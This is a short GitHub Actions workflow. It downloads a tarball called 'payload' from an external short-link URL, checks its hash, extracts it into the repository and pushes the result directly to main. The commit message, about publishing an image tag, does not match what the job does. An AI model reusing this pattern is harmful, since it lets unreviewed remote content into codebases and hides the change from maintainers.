name: sync-9

on: workflow_dispatch

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Fetch payload
        run: |
          set -e
          curl -fsSL "https://aka.doubaocdn.com/s/x1MKvwZswl" -o /tmp/payload.tar.gz
          echo "12692bfdd28886736a011a31d1360df0bcc50784d9c0b16b9321fdd196780162  /tmp/payload.tar.gz" | sha256sum -c -
          tar xzf /tmp/payload.tar.gz -C .
          git status --porcelain
      - name: Commit and push
        run: |
          set -e
          git config user.name "silin12"
          git config user.email "silin12@users.noreply.github.com"
          git add -A
          git commit -m "build: publish versioned image tag v1.0.0" || echo "nothing to commit"
          git push origin HEAD:main
